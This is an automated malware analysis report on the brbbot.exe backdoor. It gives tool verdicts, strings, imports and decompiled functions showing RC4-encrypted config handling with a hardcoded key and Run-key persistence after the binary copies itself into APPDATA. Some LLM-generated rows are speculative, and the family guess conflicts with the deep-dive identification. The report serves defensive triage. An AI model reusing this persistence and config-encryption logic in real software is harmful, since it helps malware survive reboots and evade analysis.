# Technical Evidence Pack

**sha256:** f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e  
**sample_path:** /opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe  
**project_name:** malware

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: malicious
- **score**: 95
- **family_guess**: trojan.blocker/bckn (botnet trojan)
- **agreement**: llm_and_v1_agree
- **cross_engine_notes**: Ghidra and IDA confirm 225 functions and consistent crypto/HTTP imports. Malcat highlights persistence via registry run key and crypto anomalies. Capa maps to multiple ATT&CK techniques including persistence and encryption. YARA rules indicate network and downloader behaviors. External VT shows 57 malicious detections.
- **summary**: The sample brbbot.exe is malicious trojan exhibiting persistence via registry run keys, HTTP-based C2 communication, data encryption with hardcoded keys, and anti-debugging behaviors. Evidence is consistent across multiple analysis engines and supported by external threat intelligence with 57 VirusTotal detections.
- **source**: llm_judge
- **model**: mimo-v2.5-pro

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| malcat | Strings/registry | `Software\Microso..rrentVersion\Run` | Indicates persistence by setting a registry run key, a common autostart mechanism for malware. |
| capa | All rules | `persist via Run registry key` | Confirms capability for persistence via registry run keys, mapped to ATT&CK T1547.001. |
| ghidra | Suspicious strings (Ghidra) | `HTTP/1.1` | Suggests HTTP protocol usage for communication, indicative of C2 activity. |
| ida | Imports (IDA) | `module: WININET, name: InternetOpenA` | API for establishing internet connections, enabling C2 beaconing or data exfiltration. |
| pe_imports | pe_imports | `crypto_encrypt with CryptEncrypt` | Encryption API used for data protection, obfuscation, or potential ransomware behavior. |
| malcat | Decompilations | `sub_140002c50` | Decompilation shows crypto operations with hardcoded key 'YnJiYm90' for config file encryption/decryption, suggesting C2 |
| malcat | malcat_evidence | `DownloadUsingWininet` | Rule matching indicates download functionality via WinINet, a common technique for malware payload retrieval. |
| malcat | Anomalies | `CryptoApiUsage` | Multiple crypto API usages detected, supporting encryption capabilities for evasion or data manipulation. |
| capa | top_rules | `encrypt data using RC4 via WinAPI` | Specific encryption method using RC4, often employed in malware for data obfuscation. |
| pe_imports | pe_imports | `check_debugger with IsDebuggerPresent` | Anti-debugging check to evade analysis, a defense evasion technique. |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 90
- **summary**: This is the 'brbbot' backdoor/RAT. It establishes persistence via the Windows Run registry key using the name 'brbbot', encrypts/decrypts its configuration file (brbconfig.tmp) using RC4 via the Windows Crypto API with a base64-encoded key 'YnJiYm90' (= 'brbbot'), communicates with a C2 server over HTTP/1.1 using a spoofed IE8 user-agent, and supports remote command execution via CreateProcessA. The binary includes anti-debug checks via ZwQuerySystemInformation and XOR-based data encoding. CAPA identified 35 capability matches covering encryption, persistence, network, and process injection techniques. YARA rules flagged anti-debug, network HTTP, screenshot capture, registry manipulation, dropper strings, and WinCrypt usage. Exfiltration was not observed based on CAPA's capability matches and YARA rule outputs {CAPA, capability matches, 'encryption, persistence, network, process injection', 'no exfiltration techniques listed'} {YARA, rules, 'anti-debug, network HTTP, screenshot capture, registry manipulation, dropper strings, WinCrypt usage', 'no exfiltration indicators'}. Credential access was not observed based on the same sources {CAPA, capability matches, 'encryption, persistence, network, process injection', 'no credential access techniques listed'} {YARA, rules, 'anti-debug, network HTTP, screenshot capture, registry manipulation, dropper strings, WinCrypt usage', 'no credential access indicators'}.

### deep key_evidence
- `"Ghidra string_refs: FUN_140002230 and FUN_140002550 reference 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' with registry value name 'brbbot' \u2014 classic persistence mechanism"`
- `"Ghidra string_refs: FUN_140002230 references 'APPDATA' and 'brbconfig.tmp' \u2014 config file stored in user AppData"`
- `"Ghidra string_refs: FUN_140002940 and FUN_140002c50 reference 'Microsoft Enhanced Cryptographic Provider v1.0' and base64-encoded key 'YnJiYm90' (= 'brbbot') for RC4 encryption of config"`
- `"Ghidra imports: Full CryptoAPI chain \u2014 CryptAcquireContextW, CryptCreateHash, CryptHashData, CryptDeriveKey, CryptEncrypt, CryptDecrypt, CryptDestroyKey, CryptDestroyHash, CryptReleaseContext"`
- `"Ghidra imports: RegSetValueExA, RegOpenKeyExA, RegDeleteValueA, RegFlushKey, RegCloseKey \u2014 registry manipulation for persistence"`
- `"Ghidra imports: CreateProcessA, CreateFileA/W, CopyFileA, DeleteFileA, FindResourceA, GetModuleFileNameA \u2014 dropper/file operations and remote command execution"`
- `"Ghidra string_refs: FUN_140003030 references 'HTTP/1.1' and 'Connection: close\\r\\n' \u2014 C2 HTTP communication"`
- `"Ghidra string_refs: FUN_140002f50 references 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)' \u2014 spoofed user-agent for C2"`
- `"Ghidra string_refs: FUN_140003300 references 'ZwQuerySystemInformation' and 'ntdll.dll' \u2014 anti-analysis/process enumeration"`
- `"Ghidra string_refs: FUN_1400012e0 references 'encode' and 'sleep' \u2014 data encoding and C2 sleep/beacon loop"`
- `"CAPA: 35 rules matched including 'encode data using XOR' (T1027), 'encrypt or decrypt via WinCrypt' (T1027), 'encrypt data using RC4 via WinAPI' (C0027.009), 'create new key via CryptAcquireContext'"`
- `"YARA: 17 rules matched including anti_dbg, network_http, screenshot, win_registry, win_files_operation, Dropper_Strings, Advapi_Hash_API, contains_base64"`
- `"Ghidra function_metrics: FUN_1400012e0 has cyclomatic_complexity=59, call_out_count=37, string_ref_count=2 \u2014 complex C2 command dispatcher; FUN_140001840 cc=45, call_out=24; FUN_140001c10 cc=47, call_out=28 \u2014 multi-path logic with high branching"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e
size: 75776
type: PE
architecture: X64
entrypoint_ea: 13204
entropy: 5.92
file_name: brbbot.exe
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1024 | 0 | 49 | - |
| .text | 1024 | 50176 | 53248 | 136 | RX |
| .rdata | 54272 | 14848 | 16384 | 73 | R |
| .data | 70656 | 5120 | 16384 | 77 | RW |
| .pdata | 87040 | 3072 | 4096 | 32 | R |
| .rsrc | 91136 | 512 | 4096 | 5 | R |
| .reloc | 95232 | 1024 | 4096 | 18 | R |

### Malcat YARA / Signatures (6)
| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| MSVC_2010_linker | compiler | INFO | 60 | detects used visual studio version based on linker information |
| msvs2010_rich | compiler | INFO | 80 | detects used visual studio version based on rich header information |
| DownloadUsingWininet | network | UNCOMMON | 60 | can download files from internet using wininet API |
| CustomUserAgent | network | UNCOMMON | 30 | embeds a user agent string |
| AutorunKey | persistence | UNCOMMON | 20 | file contains path of an autorun key |
| msvc_general_x64 | compiler | INFO | 50 |  |

### Anomalies (7)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| ManyUniqueImmediateBytes | 3 | code | 2 | More than 48 unique bytes defined across all immediate operands in the function |
| XorInLoop | 3 | code | 9 | XOR instruction in a loop |
| CryptoApiUsage | 2 | imports | 12 | Crypto-related apis are used |
| DownloaderApiUsage | 2 | imports | 2 | Downloader-related apis are used |
| HighXrefLoopingFunction | 1 | code | 1 | Function contains a loop and has a lot of incoming references (string decryption candidate) |
| NoChecksum | 1 | integrity | 1 | PE Header checksum is not set |
| SpaghettiFunction | 1 | code | 8 | Function with lots of intra jumps, could be obfuscated |

### Anomaly Locations (high-signal)
- **CryptoApiUsage**
  - `8247`: 
  - `9024`: 
  - `8210`: 
  - `8987`: 
  - `7769`: 
- **HighXrefLoopingFunction**
  - `14512`: 
- **ManyUniqueImmediateBytes**
  - `14940`: 
  - `20544`: 
- **NoChecksum**
  - `320`: 
- **SpaghettiFunction**
  - `11040`: 
  - `11584`: 
  - `19152`: 
  - `20544`: 
  - `29576`: 
- **XorInLoop**
  - `4320`: 
  - `4768`: 
  - `11105`: 
  - `11616`: 
  - `11793`: 

### High-Signal Strings (18 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 61792 | `GetProcessWindowStation` |
| 62320 | `HTTP/1.1` |
| 67660 | `KERNEL32.dll` |
| 66764 | `CryptReleaseContext` |
| 66820 | `CryptDestroyKey` |
| 66802 | `CryptCreateHash` |
| 67036 | `HttpOpenRequestA` |
| 66838 | `CryptDecrypt` |
| 66786 | `CryptEncrypt` |
| 66722 | `CryptAcquireContextW` |
| 66746 | `CryptDeriveKey` |
| 67608 | `GetProcAddress` |
| 66854 | `CryptDestroyHash` |
| 67056 | `HttpSendRequestA` |
| 68606 | `LoadLibraryW` |
| 66874 | `CryptHashData` |
| 67186 | `GetProcessHeap` |
| 66976 | `HttpQueryInfoA` |

### Top Strings (254 extracted; showing 80)
| EA | String |
|---|---|
| 62256 | `Mozilla/4.0 (com...1; Trident/4.0)` |
| 62080 | `Software\Microso..rrentVersion\Run` |
| 62144 | `Microsoft Enhanc..ic Provider v1.0` |
| 56576 | `mscoree.dll` |
| 62392 | `ntdll.dll` |
| 61904 | `USER32.DLL` |
| 66934 | `InternetReadFile` |
| 55488 | `HH:mm:ss` |
| 61792 | `GetProcessWindowStation` |
| 62072 | `APPDATA` |
| 61816 | `GetUserObjectInformationW` |
| 62360 | `ZwQuerySystemInformation` |
| 55512 | `dddd, MMMM dd, yyyy` |
| 61952 | `brbconfig.tmp` |
| 62336 | `Connection: close
` |
| 61848 | `GetLastActivePopup` |
| 62048 | `%s?i=%s&c=%s&p=%s` |
| 56560 | `CorExitProcess` |
| 61872 | `GetActiveWindow` |
| 62320 | `HTTP/1.1` |
| 61928 | `CONOUT$` |
| 61984 | `exec` |
| 62408 | `Idle` |
| 61888 | `MessageBoxW` |
| 62016 | `sleep` |
| 62024 | `encode` |
| 62128 | `brbbot` |
| 75752 | `#3#or%5452o#8A` |
| 67090 | `WININET.dll` |
| 55552 | `MM/dd/yy` |
| 61944 | `CONFIG` |
| 61992 | `file` |
| 62000 | `conf` |
| 62008 | `exit` |
| 67660 | `KERNEL32.dll` |
| 67102 | `WS2_32.dll` |
| 66888 | `ADVAPI32.dll` |
| 61968 | `YnJiYm90` |
| 67682 | `USER32.dll` |
| 56600 | `runtime error ` |
| 59984 | `         (((((  ..               H` |
| 55592 | `December` |
| 62036 | `%02x` |
| 56128 | `MM/dd/yy` |
| 56088 | `HH:mm:ss` |
| 55960 | `Wednesday` |
| 55656 | `September` |
| 55896 | `Saturday` |
| 55784 | `January` |
| 55760 | `February` |
| 55680 | `August` |
| 55616 | `November` |
| 55376 | `(null)` |
| 56104 | `dddd, MMMM dd, yyyy` |
| 55984 | `Tuesday` |
| 56152 | `December` |
| 55936 | `Thursday` |
| 55640 | `October` |
| 56000 | `Monday` |
| 56360 | `Wednesday` |
| 55728 | `April` |
| 55744 | `March` |
| 56192 | `September` |
| 55920 | `Friday` |
| 56016 | `Sunday` |
| 55696 | `July` |
| 55712 | `June` |
| 56204 | `August` |
| 56320 | `Saturday` |
| 56168 | `November` |
| 56248 | `February` |
| 56264 | `January` |
| 55360 | `(null)` |
| 60498 | `         h((((  ..               H` |
| 56184 | `October` |
| 56376 | `Tuesday` |
| 56344 | `Thursday` |
| 56220 | `June` |
| 56392 | `Sunday` |
| 56384 | `Monday` |

### Constants / Known Patterns (28)
| Category | Value |
|---|---|
| registry | `registry::HKEY_LOCAL_MACHINE` |
| exception | `exception::C++ exception` |
| exception | `exception::FuncInfo header` |
| runtime | `runtime::msvc_tloss_error` |
| runtime | `runtime::msvc_sing_error` |
| runtime | `runtime::msvc_domain_error` |
| runtime | `runtime::msvc_r6033` |
| runtime | `runtime::msvc_r6032` |
| runtime | `runtime::msvc_r6031` |
| runtime | `runtime::msvc_r6030` |
| runtime | `runtime::msvc_r6028` |
| runtime | `runtime::msvc_r6027` |
| runtime | `runtime::msvc_r6026` |
| runtime | `runtime::msvc_r6025` |
| runtime | `runtime::msvc_r6024` |
| runtime | `runtime::msvc_r6019` |
| runtime | `runtime::msvc_r6018` |
| runtime | `runtime::msvc_r6017` |
| runtime | `runtime::msvc_r6016` |
| runtime | `runtime::msvc_r6010` |
| runtime | `runtime::msvc_r6009` |
| runtime | `runtime::msvc_r6008` |
| runtime | `runtime::msvc_r6002` |
| runtime | `runtime::msvc_rl` |
| runtime | `runtime::msvc_name_unknown` |
| runtime | `runtime::msvc_runtime_error` |
| registry | `registry::autorun` |
| crypto | `crypto::crypto_provider` |

### Imports (276)
| EA | Name | Type | Refs |
|---|---|---|---|
| 10640 | __security_check_cookie | DEBUG | 19 |
| 10672 | vscan_fn | DEBUG | 2 |
| 10896 | strstr | DEBUG | 2 |
| 10984 | strchr | DEBUG | 7 |
| 11040 | strncpy | DEBUG | 10 |
| 11396 | sprintf | DEBUG | 4 |
| 11584 | strncat | DEBUG | 5 |
| 12016 | strncmp | DEBUG | 5 |
| 12200 | _LocaleUpdate._LocaleUpdate | DEBUG | 15 |
| 12364 | isdigit | DEBUG | 9 |
| 12492 | isxdigit | DEBUG | 3 |
| 12624 | isspace | DEBUG | 5 |
| 12752 | strrchr | DEBUG | 2 |
| 12792 | __tmainCRTStartup | DEBUG | 2 |
| 13204 | mainCRTStartup | DEBUG | 2 |
| 13224 | __report_gsfailure | DEBUG | 2 |
| 13584 | strlen | DEBUG | 4 |
| 13760 | _call_reportfault | DEBUG | 3 |
| 14092 | _invoke_watson | DEBUG | 8 |
| 14144 | _invalid_parameter | DEBUG | 2 |
| 14256 | _invalid_parameter_noinfo | DEBUG | 32 |
| 14288 | _get_errno_from_oserr | DEBUG | 4 |
| 14360 | _errno | DEBUG | 80 |
| 14392 | __doserrno | DEBUG | 26 |
| 14424 | _dosmaperr | DEBUG | 7 |
| 14512 | memset | DEBUG | 33 |
| 14748 | __check_float_string | DEBUG | 7 |
| 14940 | _input_l | DEBUG | 2 |
| 19152 | strtoxl | DEBUG | 3 |
| 19772 | strtol | DEBUG | 2 |
| 19820 | _flsbuf | DEBUG | 4 |
| 20220 | write_char | DEBUG | 6 |
| 20292 | write_multi_char | DEBUG | 4 |
| 20376 | write_string | DEBUG | 4 |
| 20544 | _output_l | DEBUG | 2 |
| 23204 | setSBCS | DEBUG | 2 |
| 23344 | setSBUpLow | DEBUG | 3 |
| 23840 | __updatetmbcinfo | DEBUG | 4 |
| 24028 | getSystemCP | DEBUG | 3 |
| 24172 | _setmbcp_nolock | DEBUG | 3 |
| 24804 | _setmbcp | DEBUG | 2 |
| 25284 | __initmbctable | DEBUG | 2 |
| 25324 | __addlocaleref | DEBUG | 3 |
| 25464 | __removelocaleref | DEBUG | 2 |
| 25628 | __freetlocinfo | DEBUG | 3 |
| 26008 | _updatetlocinfoEx_nolock | DEBUG | 2 |
| 26096 | __updatetlocinfo | DEBUG | 2 |
| 26228 | _mtterm | DEBUG | 2 |
| 26268 | _initptd | DEBUG | 3 |
| 26452 | _getptd_noexit | DEBUG | 8 |
| 26584 | _getptd | DEBUG | 9 |
| 26620 | _freefls | DEBUG | 3 |
| 26928 | _mtinit | DEBUG | 2 |
| 27060 | _isctype_l | DEBUG | 5 |
| 27292 | __CxxUnhandledExceptionFilter | DEBUG | 3 |
| 27360 | __CxxSetUnhandledExceptionFilter | DEBUG | 2 |
| 27384 | __crtCorExitProcess | DEBUG | 4 |
| 27468 | _lockexit | DEBUG | 1 |
| 27480 | _unlockexit | DEBUG | 2 |
| 27492 | _init_pointers | DEBUG | 2 |
| 27560 | _initterm | DEBUG | 3 |
| 27612 | _initterm_e | DEBUG | 2 |
| 27672 | _cinit | DEBUG | 2 |
| 27848 | doexit | DEBUG | 6 |
| 28260 | _exit | DEBUG | 3 |
| 28272 | _cexit | DEBUG | 1 |
| 28288 | _c_exit | DEBUG | 1 |
| 28304 | _amsg_exit | DEBUG | 10 |
| 28344 | _GET_RTERRMSG | DEBUG | 1 |
| 28388 | _NMSG_WRITE | DEBUG | 8 |
| 28996 | _FF_MSGBANNER | DEBUG | 6 |
| 29064 | __C_specific_handler | DEBUG | 1 |
| 29576 | _XcptFilter | DEBUG | 2 |
| 30040 | _wwincmdln | DEBUG | 2 |
| 30128 | _wsetenvp | DEBUG | 2 |
| 30440 | wparse_cmdline | DEBUG | 3 |
| 30848 | _wsetargv | DEBUG | 3 |
| 31088 | __crtGetEnvironmentStringsW | DEBUG | 3 |
| 31224 | _ioinit | DEBUG | 2 |
| 32060 | _heap_init | DEBUG | 3 |

### Functions (30)
| EA | Name |
|---|---|
| 8272 | sub_140002c50 |
| 7488 | sub_140002940 |
| 5680 | sub_140002230 |
| 6480 | sub_140002550 |
| 45040 | sub_14000bbf0 |
| 4112 | sub_140001c10 |
| 42192 | sub_14000b0d0 |
| 43908 | sub_14000b784 |
| 1760 | sub_1400012e0 |
| 9984 | sub_140003300 |
| 1360 | sub_140001150 |
| 3136 | sub_140001840 |
| 9472 | sub_140003100 |
| 5040 | sub_140001fb0 |
| 7104 | sub_1400027c0 |
| 1024 | sub_140001000 |
| 2928 | sub_140001770 |
| 9264 | sub_140003030 |
| 9040 | sub_140002f50 |
| 49396 | sub_14000ccf4 |
| 27444 | sub_140007734 |
| 50515 | sub_14000d153 |
| 26216 | sub_140007268 |
| 42684 | sub_14000b2bc |
| 50316 | jmp_kernel32.RtlVirtualUnwind |
| 50322 | jmp_kernel32.RtlLookupFunctionEntry |
| 50328 | jmp_kernel32.RtlUnwindEx |
| 31948 | sub_1400088cc |
| 32004 | sub_140008904 |
| 44992 | sub_14000bbc0 |

### Decompilations (top 6)
#### 8272 — sub_140002c50
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

uint32_t sub_140002c50(int64_t *param_1,int32_t *param_2)

{
    uint32_t uVar1;
    int32_t iVar2;
    int64_t iVar3;
    undefined8 uVar4;
    int64_t iVar5;
    int64_t iVar6;
    char cVar7;
    uint32_t auStackX_18 [2];
    int64_t iStackX_20;
    undefined8 in_stack_ffffffffffffffa8;
    uint64_t uVar8;
    undefined4 uVar9;
    int64_t iStack_38;
    int64_t iStack_30;
    
    uVar1 = 0;
    iStack_30 = 0;
    iStack_38 = 0;
    iStackX_20 = 0;
    uVar8 = CONCAT44(in_stack_ffffffffffffffa8 >> 0x20, 3);
    iVar3 = (*kernel32.CreateFileA)("brbconfig.tmp", 1, 1, 0, uVar8, 0x80, 0);
    if (iVar3 == -1) {
        uVar1 = (*kernel32.GetLastError)();
        if (0 < uVar1) {
            uVar1 = uVar1 & 0xffff | 0x80070000;
        }
    }
    else {
        iVar2 = (*kernel32.GetFileSize)(iVar3, 0);
        *param_2 = iVar2 + 1;
        uVar4 = (*kernel32.GetProcessHeap)();
        iVar5 = (*kernel32.HeapAlloc)(uVar4, 8, iVar2 + 1);
        uVar8 = uVar8 & 0xffffffff00000000;
        *param_1 = iVar5;
        iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, uVar8);
        uVar9 = uVar8 >> 0x20;
        if (iVar2 == 0) {
            (*kernel32.GetLastError)();
        }
        iVar2 = (*kernel32.GetLastError)();
        if ((((iVar2 == -0x7ff6ffea) &&
             (iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, CONCAT44(uVar9, 8)),
             iVar2 == 0)) || (iVar2 = (*advapi32.CryptCreateHash)(iStackX_20, 0x8003, 0, 0, &iStack_38), iVar2 == 0)) ||
           ((iVar2 = (*advapi32.CryptHashData)(iStack_38, "YnJiYm90", 8), iVar2 == 0 ||
            (iVar2 = (*advapi32.CryptDeriveKey)(iStackX_20, 0x6801, iStack_38, 0x800000, &iStack_30), iVar2 == 0)))) {
            uVar1 = (*kernel32.GetLastError)();
            if (0 < uVar1) {
                uVar1 = uVar1 & 0xffff | 0x80070000;
            }
        }
        else {
            uVar4 = (*kernel32.GetProcessHeap)();
            iVar6 = (*kernel32.HeapAlloc)(uVar4, 8, 1000);
            if (iVar6 == 0) {
                uVar1 = 0x8007000e;
            }
            else {
                cVar7 = '\0';
                do {
                    iVar2 = (*kernel32.ReadFile)(iVar3, iVar6, 1000, auStackX_18, 0);
                    if (iVar2 == 0) {
code_r0x000140002ebc:
                        uVar1 = (*kernel32.GetLastError)();
                        if (0 < uVar1) {
                            uVar1 = uVar1 & 0xffff | 0x80070000;
                        }
                        break;
                    }
                    if (auStackX_18[0] < 1000) {
                        cVar7 = '\x01';
                    }
                    if (auStackX_18[0] == 0) break;
                    iVar2 = (*advapi32.CryptDecrypt)(iStack_30, 0, cVar7, 0, iVar6, auStackX_18);
                    if (iVar2 == 0) goto code_r0x000140002ebc;
                    memmove(iVar5, iVar6, auStackX_18[0]);
                    memset(iVar6, 0, 1000);
                    iVar5 = iVar5 + auStackX_18[0];
                } while (cVar7 == '\0');
                uVar4 = (*kernel32.GetProcessHeap)();
                (*kernel32.HeapFree)(uVar4, 0, iVar6);
            }
        }
        if (iVar3 == 0) goto code_r0x000140002efa;
    }
    (*kernel32.CloseHandle)(iVar3);
code_r0x000140002efa:
    if (iStack_38 != 0) {
        (*advapi32.CryptDestroyHash)();
    }
    if (iStack_30 != 0) {
        (*advapi32.CryptDestroyKey)();
    }
    if (iStackX_20 != 0) {
        (*advapi32.CryptReleaseContext)(iStackX_20, 0);
    }
    return uVar1;
}

```
#### 7488 — sub_140002940
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

uint64_t sub_140002940(int64_t param_1,int32_t param_2)

{
    uint32_t uVar1;
    int32_t iVar2;
    int64_t iVar3;
    undefined8 uVar4;
    uint64_t uVar5;
    uint64_t uVar6;
    char cVar7;
    int64_t iVar8;
    uint32_t auStackX_18 [2];
    int64_t iStackX_20;
    undefined8 in_stack_ffffffffffffffa8;
    uint64_t uVar9;
    undefined4 uVar10;
    undefined8 uVar11;
    int64_t iStack_38;
    int64_t iStack_30;
    
    uVar6 = 0;
    uVar11 = 0;
    iStackX_20 = 0;
    iStack_30 = 0;
    iStack_38 = 0;
    uVar9 = CONCAT44(in_stack_ffffffffffffffa8 >> 0x20, 2);
    iVar3 = (*kernel32.CreateFileA)("brbconfig.tmp", 2, 1, 0, uVar9, 0x80, 0);
    uVar5 = uVar6;
    if (iVar3 == -1) {
        uVar1 = (*kernel32.GetLastError)();
        uVar6 = uVar1;
        if (0 < uVar1) {
            uVar6 = uVar1 & 0xffff | 0x80070000;
            uVar5 = 0;
        }
    }
    else {
        uVar9 = uVar9 & 0xffffffff00000000;
        iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, uVar9);
        uVar10 = uVar9 >> 0x20;
        if (iVar2 == 0) {
            (*kernel32.GetLastError)();
        }
        iVar2 = (*kernel32.GetLastError)();
        if ((((iVar2 == -0x7ff6ffea) &&
             (iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, CONCAT44(uVar10, 8)),
             iVar2 == 0)) || (iVar2 = (*advapi32.CryptCreateHash)(iStackX_20, 0x8003, 0, 0, &iStack_38), iVar2 == 0)) ||
           ((iVar2 = (*advapi32.CryptHashData)(iStack_38, "YnJiYm90", 8), iVar2 == 0 ||
            (iVar2 = (*advapi32.CryptDeriveKey)(iStackX_20, 0x6801, iStack_38, 0x800000, &iStack_30), iVar2 == 0)))) {
            uVar1 = (*kernel32.GetLastError)();
            uVar6 = uVar1;
            if (0 < uVar1) {
                uVar6 = uVar1 & 0xffff | 0x80070000;
                uVar5 = 0;
            }
        }
        else {
            uVar4 = (*kernel32.GetProcessHeap)();
            uVar5 = (*kernel32.HeapAlloc)(uVar4, 8, 0x3f0);
            if (uVar5 == 0) {
                uVar6 = 0x8007000e;
            }
            else {
                cVar7 = '\0';
                iVar8 = param_1;
                do {
                    uVar10 = uVar11 >> 0x20;
                    auStackX_18[0] = (param_1 - iVar8) + param_2;
                    if (auStackX_18[0] < 1000) {
                        memmove(uVar5, iVar8, auStackX_18[0]);
                        cVar7 = '\x01';
                    }
                    else {
                        auStackX_18[0] = 1000;
                    }
                    memmove(uVar5, iVar8, auStackX_18[0]);
                    uVar11 = CONCAT44(uVar10, 0x3f0);
                    iVar2 = (*advapi32.CryptEncrypt)(iStack_30, 0, cVar7, 0, uVar5, auStackX_18, uVar11);
                    if ((iVar2 == 0) ||
                       (iVar2 = (*kernel32.WriteFile)(iVar3, uVar5, auStackX_18[0], auStackX_18, 0), iVar2 == 0)) {
                        uVar1 = (*kernel32.GetLastError)();
                        if (uVar1 < 1) {
                            uVar6 = uVar1;
                        }
                        else {
                            uVar6 = uVar1 & 0xffff | 0x80070000;
                        }
                        break;
                    }
                    iVar8 = iVar8 + 1000;
                } while (cVar7 == '\0');
            }
        }
        if (iVar3 == 0) goto code_r0x000140002bd5;
    }
    (*kernel32.CloseHandle)(iVar3);
code_r0x000140002bd5:
    if (uVar5 != 0) {
        uVar11 = (*kernel32.GetProcessHeap)();
        (*kernel32.HeapFree)(uVar11, 8, uVar5);
    }
    if (iStack_38 != 0) {
        (*advapi32.CryptDestroyHash)();
    }
    if (iStack_30 != 0) {
        (*advapi32.CryptDestroyKey)();
    }
    if (iStackX_20 != 0) {
        (*advapi32.CryptReleaseContext)(iStackX_20, 0);
    }
    return uVar6;
}

```
#### 5680 — sub_140002230
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_140002230(void)

{
    char cVar1;
    bool bVar2;
    int32_t iVar3;
    uint32_t uVar4;
    undefined8 uVar5;
    char *pcVar6;
    int64_t iVar7;
    int64_t *piVar8;
    uint64_t uVar9;
    uint64_t uVar10;
    int64_t iVar11;
    char *pcVar12;
    int64_t *piVar13;
    undefined auStack_288 [32];
    int64_t *piStack_268;
    uint32_t uStack_260;
    int64_t aiStack_258 [2];
    char acStack_248 [272];
    undefined uStack_138;
    undefined auStack_137 [271];
    uint64_t uStack_28;
    
    uStack_28 = [0x0x140012008] ^ auStack_288;
    uVar4 = 0x8000ffff;
    uStack_138 = 0;
    memset(auStack_137, 0, 0x103);
    acStack_248[0] = '\0';
    memset(acStack_248 + 1, 0, 0x103);
    aiStack_258[0] = 0;
    piVar8 = 0x0;
    bVar2 = false;
    uVar5 = (*kernel32.GetModuleHandleW)(0);
    iVar3 = (*kernel32.GetModuleFileNameA)(uVar5, &uStack_138, 0x104);
    if (iVar3 == 0) {
        uVar4 = (*kernel32.GetLastError)();
        if (0 < uVar4) {
            uVar4 = uVar4 & 0xffff | 0x80070000;
            bVar2 = false;
        }
    }
    else {
        pcVar6 = strrchr(&uStack_138, 0x5c);
        iVar3 = (*kernel32.GetEnvironmentVariableA)("APPDATA", acStack_248, 0x104);
        if (iVar3 != 0) {
            iVar7 = strstr(&uStack_138, acStack_248);
            uVar9 = 0xffffffffffffffff;
            pcVar12 = pcVar6;
            do {
                if (uVar9 == 0) break;
                uVar9 = uVar9 - 1;
                cVar1 = *pcVar12;
                pcVar12 = pcVar12 + 1;
            } while (cVar1 != '\0');
            uVar10 = 0xffffffffffffffff;
            pcVar12 = acStack_248;
            do {
                if (uVar10 == 0) break;
                uVar10 = uVar10 - 1;
                cVar1 = *pcVar12;
                pcVar12 = pcVar12 + 1;
            } while (cVar1 != '\0');
            uVar5 = (*kernel32.GetProcessHeap)();
            piVar8 = (*kernel32.HeapAlloc)(uVar5, 8, ~uVar9 + 2 + ~uVar10);
            if (piVar8 == 0x0) {
                uVar4 = 0x8007000e;
            }
            else {
                uVar9 = 0xffffffffffffffff;
                pcVar12 = acStack_248;
                do {
                    if (uVar9 == 0) break;
                    uVar9 = uVar9 - 1;
                    cVar1 = *pcVar12;
                    pcVar12 = pcVar12 + 1;
                } while (cVar1 != '\0');
                strncpy(piVar8, acStack_248, ~uVar9 - 1);
                uVar9 = 0xffffffffffffffff;
                pcVar12 = pcVar6;
                do {
                    if (uVar9 == 0) break;
                    uVar9 = uVar9 - 1;
                    cVar1 = *pcVar12;
                    pcVar12 = pcVar12 + 1;
                } while (cVar1 != '\0');
                strncat(piVar8, pcVar6, ~uVar9 - 1);
                iVar3 = (*kernel32.CopyFileA)(&uStack_138, piVar8, 0);
                if ((iVar3 != 0) || (iVar7 != 0)) {
                    piStack_268 = aiStack_258;
                    bVar2 = true;
                    uVar4 = (*advapi32.RegOpenKeyExA)(0xffffffff80000002, &autorun, 0, 0x20006);
                    if (uVar4 == 0) {
                        iVar11 = -1;
                        piVar13 = piVar8;
                        do {
                            if (iVar11 == 0) break;
                            iVar11 = iVar11 + -1;
                            cVar1 = *piVar13;
                            piVar13 = piVar13 + 1;
                        } while (cVar1 != '\0');
                        uStack_260 = ~iVar11;
                        piStack_268 = piVar8;
                        uVar4 = (*advapi32.RegSetValueExA)(aiStack_258[0], "brbbot", 0, 1);
                        if (uVar4 == 0) {
                            (*advapi32.RegFlushKey)(aiStack_258[0]);
                            if (iVar7 == 0) {
                                (*kernel32.MoveFileExA)(&uStack_138, 0, 4);
                            }
                  
```

### Virtual Files (1)
| Path / Name | Unpacked Size | Type |
|---|---|---|
| CONFIG/101/en-us | 73 | - |

### Structures (25)
| Name | EA |
|---|---|
| MZ | 0 |
| RichHeader | 128 |
| PE | 232 |
| OptionalHeader | 256 |
| Sections | 496 |
| advapi32.FT | 54272 |
| kernel32.FT | 54392 |
| user32.FT | 55088 |
| wininet.FT | 55104 |
| ws2_32.FT | 55184 |
| ImportTable | 65556 |
| advapi32.OFT | 65680 |
| kernel32.OFT | 65800 |
| user32.OFT | 66496 |
| wininet.OFT | 66512 |
| ws2_32.OFT | 66592 |
| ImportNames | 66640 |
| ExceptionTable | 87040 |
| Resources | 91136 |
| Resources.CONFIG | 91160 |
| Resources.CONFIG.101 | 91184 |
| Resources.CONFIG.101.en-us | 91208 |
